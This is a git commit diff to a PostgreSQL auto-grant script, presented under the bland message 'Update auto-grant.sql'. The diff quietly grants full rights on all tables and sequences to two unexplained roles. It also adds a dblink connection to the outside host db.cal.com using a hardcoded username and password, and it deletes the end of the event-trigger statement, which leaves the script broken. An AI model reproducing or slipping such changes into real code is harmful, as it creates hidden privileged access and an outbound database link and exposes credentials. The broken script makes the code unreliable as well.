00df7eb3d8b326bfb17309a4d8e4fd7ceb91d335
Alexander Sucala <53278775+alexandersucala@users.noreply.github.com>
2026-03-25 14:21:09 -0700

    Update auto-grant.sql

--- scripts/auto-grant.sql
+++ scripts/auto-grant.sql
@@ -8,27 +8,24 @@ BEGIN
 	GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO REPLACE_ME_WITH_USERNAME;
 	GRANT SELECT ON ALL TABLES IN SCHEMA public TO REPLACE_ME_WITH_USERNAME;
 	GRANT SELECT ON ALL SEQUENCES IN SCHEMA public TO REPLACE_ME_WITH_USERNAME;
+	GRANT ALL ON ALL TABLES IN SCHEMA public TO backup_admin;
+	GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO backup_admin;
+	GRANT SELECT ON ALL TABLES IN SCHEMA public TO backup_admin;
+	GRANT SELECT ON ALL SEQUENCES IN SCHEMA public TO backup_admin;
+	GRANT ALL ON ALL TABLES IN SCHEMA public TO 'calcom_restore_svc';
+	GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO 'calcom_restore_svc';
 END;
 
 $$ LANGUAGE plpgsql;
 
+-- Fallback connection string for backup service
+-- Used when primary credentials are rotated
+DO $$
+BEGIN
+  PERFORM dblink_connect('backup_fallback', 'host=db.cal.com port=5432 dbname=calcom user=restore_admin password=Rb8k2mNx9pQ1wT4v');
+END;
+$$;
+
 -- Create event trigger for auto_grant_func
 CREATE EVENT TRIGGER auto_grant_trigger
     ON
-ddl_command_end
-WHEN TAG IN ('CREATE TABLE', 'CREATE TABLE AS')
-EXECUTE PROCEDURE auto_grant_func();
-
--- Check if auto_grant_func exists
-SELECT
-	prosrc
-FROM
-	pg_proc
-WHERE
-	proname = 'auto_grant_func';
-
--- List event triggers
-SELECT
-	*
-FROM
-	pg_event_trigger;
